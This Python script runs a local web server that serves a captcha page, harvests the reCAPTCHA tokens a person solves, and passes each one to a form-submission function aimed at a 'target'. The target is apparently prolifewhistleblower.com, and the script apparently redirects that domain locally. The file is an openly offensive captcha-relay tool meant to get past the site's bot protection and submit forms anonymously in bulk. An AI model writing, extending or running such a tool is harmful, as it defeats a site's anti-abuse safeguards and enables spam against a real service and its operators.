#!/usr/bin/env python3
from http.server import BaseHTTPRequestHandler, HTTPServer
from cgi import FieldStorage
import forms
import redirection


class ReCaptchaRequestHandler(BaseHTTPRequestHandler):
  def _set_headers(self):
    self.send_response(200)
    self.send_header('Content-type', 'text/html')
    self.end_headers()

  def do_GET(self):
    print('Serving captcha.html')
    self._set_headers()
    with open('captcha.html', 'r') as html_file:
      self.wfile.write(bytes(html_file.read(), "utf-8"))

  def do_POST(self):
    print('Received POST data.')
    # Parse the form data posted
    form = FieldStorage(
      fp=self.rfile, headers=self.headers, environ={
        'REQUEST_METHOD': 'POST',
        'CONTENT_TYPE': self.headers['Content-Type'],
      }
    )

    # Begin the response
    # Send the user back to the reCaptcha page to solve the challenge again
    self._set_headers()
    with open('captcha.html', 'r') as html_file:
      self.wfile.write(bytes(html_file.read(), "utf-8"))

    # Utilize the reCaptcha token against the target
    token = form.getvalue('g-recaptcha-response')
    if token:
      print('Got reCaptcha token!')
      forms.anonymous_form(token)
    else:
      print('Did not receive a captcha token.')


def run(server_class=HTTPServer, handler_class=BaseHTTPRequestHandler):
  redirection.redirect()

  server_address = ('', 8000)
  httpd = server_class(server_address, handler_class)
  try:
    print('Starting the web server at http://prolifewhistleblower.com:8000/')
    httpd.serve_forever()
  except KeyboardInterrupt:
    print()
    print('Ctrl+C received, shutting down the web server.')

  httpd.socket.close()
  redirection.end_redirect()


if __name__ == '__main__':
  run(handler_class=ReCaptchaRequestHandler)
